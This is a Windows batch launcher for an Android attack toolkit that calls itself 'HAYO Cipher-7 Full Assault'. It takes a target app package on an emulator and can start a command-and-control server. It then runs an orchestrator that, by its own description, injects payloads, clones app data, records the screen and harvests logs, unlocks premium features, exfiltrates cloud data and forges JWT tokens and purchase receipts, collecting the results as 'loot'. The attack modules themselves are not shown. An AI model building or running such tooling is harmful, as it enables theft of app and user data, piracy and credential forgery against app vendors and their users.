@echo off
title HAYO Full Assault v2
cd /d "%~dp0"

REM ============================================================
REM  HAYO Cipher-7 — FULL ASSAULT ENGINE
REM  Linked to Emulator: emulator-5554
REM ============================================================

if not defined HAYO_DEV set "HAYO_DEV=emulator-5554"
set "DEV=%HAYO_DEV%"
set "PY=C:\Users\PT\AppData\Local\Programs\Python\Python312\python.exe"

set "PKG=%~1"
if "%PKG%"=="" set /p PKG="Target package: "
echo.
echo ============================================
echo  HAYO Cipher-7 FULL ASSAULT v2
echo  Target Device: %DEV%
echo ============================================
echo This will:
echo   1. Inject all payload files (including Cipher-7 modules)
echo   2. Clone app data
echo   3. Record screen + harvest logcat
echo   4. Unlock premium features
echo   5. Cloud data exfiltration
echo   6. Token forge (JWT + receipts)
echo ============================================
echo.

set /p C2="Start C2 server? (y/n): "
if /i "%C2%"=="y" (
    start "HAYO C2" cmd /c "%PY%" c2_server.py
    timeout /t 2 /nobreak >nul
)

"%PY%" orchestrator.py --full-assault %PKG% --device %DEV%
echo.
echo Full assault complete. All loot -> loot/
pause
